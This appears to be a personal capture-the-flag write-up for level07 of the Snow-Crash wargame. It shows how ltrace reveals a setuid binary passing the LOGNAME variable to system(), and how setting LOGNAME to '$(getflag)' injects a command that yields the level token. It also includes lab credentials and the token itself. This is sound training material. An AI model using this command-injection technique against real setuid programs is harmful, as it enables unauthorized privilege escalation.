# Flag 07

- Access to Snow-Crash VM using level07/wiok45aaoguiboiki2tuin6ub credentials
```
e1r9p7% ssh -p 4242 level07@10.11.100.146
```

- `ll`
```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
```

- Run level07
```
level07@SnowCrash:~$ ./level07 
level07
level07@SnowCrash:~$ ./level07 aaa
level07
level07@SnowCrash:~$ ./level07 aaa bbb
level07
```

- I think that the binary show 1st arg, so show the prog name 

- `strings level07`
```
not interesting
```

- Try with ltrace 
```
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                   = 2007
geteuid()                                                   = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)         = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)         = 0
getenv("LOGNAME")                                           = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4a, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

-  So now as we see the binary use `getenv("LOGNAME")`, so it shows the env var of LOGNAME
```
level07@SnowCrash:~$ echo $LOGNAME
level07
```

- I will try to modify the value of the env var `LOGNAME`.
```
level07@SnowCrash:~$ export LOGNAME='issam'

level07@SnowCrash:~$ ./level07
issam

level07@SnowCrash:~$ echo $LOGNAME
issam
```

- Now it's clear, I will try to pass the exec of getflag to LOGNAME env var 
```
level07@SnowCrash:~$ export LOGNAME='$(getflag)'

level07@SnowCrash:~$ echo $LOGNAME
$(getflag)

level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

